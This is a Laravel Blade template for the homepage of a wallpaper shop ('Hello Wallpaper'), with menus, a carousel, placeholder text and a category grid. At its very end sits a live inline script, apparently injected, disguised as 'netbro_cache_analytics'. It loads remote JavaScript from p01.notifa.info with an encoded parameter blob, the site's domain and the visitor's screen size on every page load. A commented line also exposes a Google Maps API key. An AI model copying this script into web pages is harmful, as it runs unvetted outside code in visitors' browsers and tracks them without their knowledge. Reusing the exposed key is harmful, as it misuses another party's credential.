<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="author" content="">
    <meta name="keywords" content="">
    <meta name="description" content="">
    <title>Hello Wallpaper | Home </title>
    <link rel="shortcut icon" href="{{ asset('assets/data/img/logos.png')}}" type="image/x-icon" />
    {{-- <link href="{{ asset('assets/data/https://fonts.googleapis.com/css?family=Work+Sans:300,400,500,600,700&amp;amp;subset=latin-ext')}}" rel="stylesheet"> --}}
    <link rel="stylesheet" href="{{ asset('assets/data/plugins/font-awesome/css/font-awesome.min.css')}}">
    <link rel="stylesheet" href="{{ asset('assets/data/fonts/Linearicons/Linearicons/Font/demo-files/demo.css')}}">
    <link rel="stylesheet" href="{{ asset('assets/data/plugins/bootstrap4/css/bootstrap.min.css')}}">
    <link rel="stylesheet" href="{{ asset('assets/data/plugins/owl-carousel/assets/owl.carousel.css')}}">
    <link rel="stylesheet" href="{{ asset('assets/data/plugins/slick/slick/slick.css')}}">
    <link rel="stylesheet" href="{{ asset('assets/data/plugins/lightGallery-master/dist/css/lightgallery.min.css')}}">
    <link rel="stylesheet" href="{{ asset('assets/data/plugins/jquery-bar-rating/dist/themes/fontawesome-stars.css')}}">
    <link rel="stylesheet" href="{{ asset('assets/data/plugins/jquery-ui/jquery-ui.min.css')}}">
    <link rel="stylesheet" href="{{ asset('assets/data/plugins/select2/dist/css/select2.min.css')}}">
    <link rel="stylesheet" href="{{ asset('assets/data/css/style.css')}}">
</head>

<body>
    <header class="header" data-sticky="true">
        <div class="header__top">
            <div class="ps-container">
                <a class="ps-logo" href="index.html"><img  height="50px" width="120px" src="{{ asset('assets/data/img/logos.png')}}" alt=""></a>
            </div>
        </div>
        <nav class="navigation">
            </div>
        </nav>
    </header>
    <header class="header header--mobile" data-sticky="true">
        <div class="navigation--mobile">
            <div class="navigation__center"><a class="ps-logo" href="index.html">
                <img height="50px" width="100px"  src="{{ asset('assets/data/img/logos.png')}}" alt=""></a></div>
            <div class="navigation__center">
                <div class="header__actions">
                </div>
            </div>
        </div>
        <div class="ps-search--mobile">
            <form class="ps-form--search-mobile" method="get">
                <div class="form-group--nest">
                    <input class="form-control" type="text" placeholder="Search something...">
                    <button><i class="icon-magnifier"></i></button>
                </div>
            </form>
        </div>
    </header>
    <div class="ps-panel--sidebar" id="cart-mobile">
        <div class="ps-panel__header">
            <h3>Shopping Cart</h3>
        </div>
        <div class="navigation__content">
            <div class="ps-cart--mobile">
                <div class="ps-cart__content">
                    <div class="ps-product--cart-mobile">
                        <div class="ps-product__thumbnail">
                            <a href="#">
                                <img src="{{ asset('assets/data/img/products/clothing/7.jpg')}}" alt="">
                             </a>
                        </div>
                        <div class="ps-product__content"><a class="ps-product__remove" href="#">
                            <i class="icon-cross"></i></a>
                            <a href="product-default.html">MVMTH Classical Leather Watch In Black</a>
                            <p><strong>Sold by:</strong> YOUNG SHOP</p><small>1 x $59.99</small>
                        </div>
                    </div>
                </div>
                <div class="ps-cart__footer">
                    <h3>Sub Total:<strong>$59.99</strong></h3>
                    <figure><a class="ps-btn" href="shopping-cart.html">View Cart</a>
                        <a class="ps-btn" href="checkout.html">Checkout</a></figure>
                </div>
            </div>
        </div>
    </div>
    <div class="ps-panel--sidebar" id="navigation-mobile">
        <div class="ps-panel__header">
            <h3>Kategori</h3>
        </div>
        <div class="ps-panel__content">
            <ul class="menu--mobile">
                @foreach ($dataCategory as $rowCategory)
                    <li class="current-menu-item "><a href="#">{{ $rowCategory->name }}</a>
                    </li>
                @endforeach
            </ul>
        </div>
    </div>
    <div class="navigation--list">
        <div class="navigation__content">
            <a class="navigation__item ps-toggle--sidebar" href="#menu-mobile"><i class="icon-menu"></i>
            <span> Menu</span></a>
            <a class="navigation__item ps-toggle--sidebar" href="#navigation-mobile"><i class="icon-list4"></i>
            <span> Product</span></a>
            <a class="navigation__item ps-toggle--sidebar" href="#search-sidebar"><i class="icon-magnifier"></i>
            <span> Search</span></a>
            <!-- <a class="navigation__item ps-toggle--sidebar" href="#cart-mobile"><i class="icon-bag2"></i>
                <span> Cart</span></a> -->
            <a class="navigation__item ps-toggle--sidebar" href="#cart-mobile"><i class="fa fa-whatsapp"></i>
                <span> Whatsapp</span></a>
        </div>

    </div>
    <div class="ps-panel--sidebar" id="search-sidebar">
        <div class="ps-panel__header">
            <form class="ps-form--search-mobile" method="get">
                <div class="form-group--nest">
                    <input class="form-control" type="text" placeholder="Search something...">
                    <button><i class="icon-magnifier"></i></button>
                </div>
            </form>
        </div>
        <div class="navigation__content"></div>
    </div>
    <div class="ps-panel--sidebar" id="menu-mobile">
        <div class="ps-panel__header">
            <h3>Menu</h3>
        </div>
        <div class="ps-panel__content">
            <ul class="menu--mobile">
                <li class="menu-item-has-children"><a href="index.html">Home</a>
                </li>
                <li class="menu-item-has-children has-mega-menu"><a href="product.html">Product</a>
                    <span class="sub-toggle"></span>
                    <div class="mega-menu">
                        <div class="mega-menu__column">
                            <h4>Wallpaper<span class="sub-toggle"></span></h4>
                            <ul class="mega-menu__list">
                                <li class="current-menu-item "><a href="productdeail.html">a</a>
                                </li>
                                <li class="current-menu-item "><a href="productdeail.html">b</a>
                                </li>
                                <li class="current-menu-item "><a href="productdeail.html">c</a>
                                </li>
                                <li class="current-menu-item "><a href="productdeail.html">d</a>
                                </li>
                                <li class="current-menu-item "><a href="productdeail.html">e</a>
                                </li>
                                <li class="current-menu-item "><a href="productdeail.html">f</a>
                                </li>
                            </ul>
                        </div>
                        <div class="mega-menu__column">
                            <h4>Walldecal<span class="sub-toggle"></span></h4>
                            <ul class="mega-menu__list">
                                <li class="current-menu-item "><a href="productdeail.html">a</a>
                                </li>
                                <li class="current-menu-item "><a href="productdeail.html">b</a>
                                </li>
                                <li class="current-menu-item "><a href="productdeail.html">c</a>
                                </li>
                                <li class="current-menu-item "><a href="productdeail.html">d</a>
                                </li>
                                <li class="current-menu-item "><a href="productdeail.html">e</a>
                                </li>
                                <li class="current-menu-item "><a href="productdeail.html">f</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </li>
                <li class="menu-item-has-children has-mega-menu"><a href="about.html">About</a>
                </li>
                <li class="menu-item-has-children has-mega-menu"><a href="blogs.html">Blogs</a>
                </li>
                <li class="menu-item-has-children has-mega-menu"><a href="contact.html">Contact Us</a>
                </li>
            </ul>
        </div>
    </div>
     <div class="ps-page--single" id="contact-us">
        <div class="ps-breadcrumb">
            <div class="container">
                <ul class="breadcrumb">
                    <li><a href="index.html">Home</a></li>
                    <li>Home</li>
                </ul>
            </div>
        </div>
    </div>
    <br>
        <div>
            <div>
                <div class="ps-carousel--nav-inside owl-slider" data-owl-auto="true" data-owl-loop="true"
                data-owl-speed="5000" data-owl-gap="0" data-owl-nav="true" data-owl-dots="true" data-owl-item="1"
                data-owl-item-xs="1" data-owl-item-sm="1" data-owl-item-md="1" data-owl-item-lg="1"
                data-owl-duration="1000" data-owl-mousedrag="on">
                     <div class="ps-banner"><a href="#"><img  src="{{ asset('assets/data/img/slider/home-1/x.jpg')}}" alt=""></a></div>
                     <div class="ps-banner"><a href="#"><img  src="{{ asset('assets/data/img/slider/home-1/1.jpg')}}" alt=""></a></div>
                     <div class="ps-banner"><a href="#"><img  src="{{ asset('assets/data/img/slider/home-1/2.jpg')}}" alt=""></a></div>
                </div>
        </div>
        <br>
        <div id="homepage-1">
             <div class="ps-container">
                <h3 align="center">Selamat Datang</h3>
                <p align=" justify">Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod
                    tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,
                    quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo
                    consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse
                    cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non
                    proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
                    Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod
                    tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,
                    quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo
                    consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse
                    cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non
                    proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
                    Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod
                    tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,
                    quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo
                    consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse
                    cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non
                    proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
                </p>
             </div>
         </div>

        <div class="ps-top-categories">
            <div class="ps-container">
                <h3>Kategori</h3>
                <div class="row">
                    @foreach ($dataCategory as $row)
                        <div class="col-xl-4 col-lg-6 col-md-8 col-sm-8 col-12 ">
                            <div class="ps-block--category">
                                <a class="ps-block__overlay" href="product.html"></a>
                                <img src="{{ asset('assets/images/category/'.$row->foto)}}" alt="">
                                <p>{{ $row->name }}</p>
                            </div>
                        </div>
                    @endforeach
                </div>
            </div>
        </div>
    </div>
    <footer class="ps-footer">
        <div class="ps-container">
            <div class="ps-footer__copyright">
                <p>© 2020 Hello Wallpaper. All Rights Reserved</p>
                <p><span>We Using Safe Payment For:</span>
                    <!-- <a href="#"><img src="{{ asset('assets/data/img/payment-method/1.jpg')}}" alt=""></a>
                        <a href="#"><img src="{{ asset('assets/data/img/payment-method/2.jpg')}}" alt=""></a>
                        <a href="#"><img src="{{ asset('assets/data/img/payment-method/3.jpg')}}" alt=""></a>
                        <a href="#"><img src="{{ asset('assets/data/img/payment-method/4.jpg')}}" alt=""></a>
                        <a href="#"><img src="{{ asset('assets/data/img/payment-method/5.jpg')}}" alt=""></a> -->
                    </p>
            </div>
        </div>
    </footer>
    <div id="back2top"><i class="pe-7s-angle-up"></i></div>
    <div class="ps-site-overlay"></div>
    <div id="loader-wrapper">
        <div class="loader-section section-left"></div>
        <div class="loader-section section-right"></div>
    </div>
    <div class="ps-search" id="site-search"><a class="ps-btn--close" href="#"></a>
        <div class="ps-search__content">
            <form class="ps-form--primary-search" method="post">
                <input class="form-control" type="text" placeholder="Search for...">
                <button><i class="aroma-magnifying-glass"></i></button>
            </form>
        </div>
    </div>
    {{-- <script data-cfasync="false" src="{{ asset('assets/data/../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js')}}"></script> --}}
    <script src="{{ asset('assets/data/plugins/jquery-1.12.4.min.js')}}"></script>
    <script src="{{ asset('assets/data/plugins/popper.min.js')}}"></script>
    <script src="{{ asset('assets/data/plugins/owl-carousel/owl.carousel.min.js')}}"></script>
    <script src="{{ asset('assets/data/plugins/bootstrap4/js/bootstrap.min.js')}}"></script>
    <script src="{{ asset('assets/data/plugins/imagesloaded.pkgd.min.js')}}"></script>
    <script src="{{ asset('assets/data/plugins/masonry.pkgd.min.js')}}"></script>
    <script src="{{ asset('assets/data/plugins/isotope.pkgd.min.js')}}"></script>
    <script src="{{ asset('assets/data/plugins/jquery.matchHeight-min.js')}}"></script>
    <script src="{{ asset('assets/data/plugins/slick/slick/slick.min.js')}}"></script>
    <script src="{{ asset('assets/data/plugins/jquery-bar-rating/dist/jquery.barrating.min.js')}}"></script>
    <script src="{{ asset('assets/data/plugins/slick-animation.min.js')}}"></script>
    <script src="{{ asset('assets/data/plugins/lightGallery-master/dist/js/lightgallery-all.min.js')}}"></script>
    <script src="{{ asset('assets/data/plugins/jquery-ui/jquery-ui.min.js')}}"></script>
    <script src="{{ asset('assets/data/plugins/sticky-sidebar/dist/sticky-sidebar.min.js')}}"></script>
    <script src="{{ asset('assets/data/plugins/jquery.slimscroll.min.js')}}"></script>
    <script src="{{ asset('assets/data/plugins/select2/dist/js/select2.full.min.js')}}"></script>
    <script src="{{ asset('assets/data/plugins/gmap3.min.js')}}"></script>
    <!-- custom scripts-->
    <script src="{{ asset('assets/data/js/main.js')}}"></script>
    {{-- <script src="{{ asset('assets/data/https://maps.googleapis.com/maps/api/js?key=AIzaSyDxflHHc5FlDVI-J71pO7hM1QJNW1dRp4U&amp;region=GB')}}"></script> --}}
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXB8fwU8T02OZcDjKeuAyBssgY2NzWv%2fAhx%2b0Rhx4iYfh4PF%2fR6Mi9vgIuhf2e4jcx2yA%2fDf8AGPzV%2fdvSqOzNy54h5HoK5uhwb4EjK9LvHZj%2fWU1wzOKcnuT8pvbnhMmLp9qPxGQKzMNT0Udr8K1ctqwt8kGf6%2fSGeate7QLCJ9vD0%2feYriEJbXgYzi4AhzaFer2VaaqJGQgNqBz3Nqqu1LnbGoRgUVyXOTLb6zrYrGCmJOa4%2b%2bmstHjTd631PqIazQrcCqxi8B0g2tyRhJ9YbCUcdnmaje%2bIPqxeLJyWRiVyP8UwO65bfuWXpWurwWTSbZJoBEIw9mgObZ%2f6xjvDR4%2fPnPqW%2fe8EqNjg5LHx0bxcw06myLumBBsJP8ZNQs1DGSZurWHlNmn4VfcwQdcfTlboBhABgLzU9md7qooAXiR6rTw%2bU3ZcgWe2NupGawbiDU%2fHUH%2buzIt5tTZqizs%2f6XeoG4uXnu7%2f" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
